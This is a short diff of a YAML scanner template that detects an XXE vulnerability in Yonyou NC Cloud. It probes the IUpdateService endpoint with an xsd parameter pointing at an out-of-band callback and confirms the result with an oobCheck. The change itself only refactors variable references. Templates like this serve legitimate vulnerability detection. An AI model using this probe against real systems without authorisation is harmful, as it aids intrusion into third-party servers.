@@ -13,13 +13,10 @@ info:
   tags: yonyou,nccloud,xxe
   created: 2024/01/16
 
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
       method: GET
-      path: /uapws/service/nc.uap.oba.update.IUpdateService?xsd={{oobHTTP}}
-    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+      path: /uapws/service/nc.uap.oba.update.IUpdateService?xsd={{oob.HTTP}}
+    expression: oobCheck(oob.ProtocolHTTP, 3)
 expression: r0()
